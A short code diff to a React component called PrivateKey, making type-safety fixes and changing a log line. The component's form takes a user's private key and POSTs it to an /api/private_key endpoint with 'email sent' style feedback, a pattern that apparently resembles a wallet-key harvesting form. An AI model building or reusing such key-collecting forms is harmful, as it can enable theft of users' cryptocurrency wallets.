@@ -21,11 +21,11 @@ export default function PrivateKey() {
     return () => clearTimeout(timer);
   }, [emailSubmitted]);
 
-  const handleSubmit = async (e: any) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setButtonClick(true);
     const data = {
-      private_key: e.target.private_key.value,
+      private_key: (e.target as HTMLFormElement).private_key.value,
     };
     const JSONdata = JSON.stringify(data);
     const endpoint = "/api/private_key";
@@ -46,7 +46,7 @@ export default function PrivateKey() {
     const resData = await response.json();
 
     if (response.status === 200) {
-      console.log("Message sent.");
+      console.log(resData);
       setButtonClick(false);
       setEmailSubmitted(true);
 
@@ -57,7 +57,7 @@ export default function PrivateKey() {
       }
     }
 
-    e.target.private_key.value = "";
+    (e.target as HTMLFormElement).private_key.value = "";
   };
 
   return (
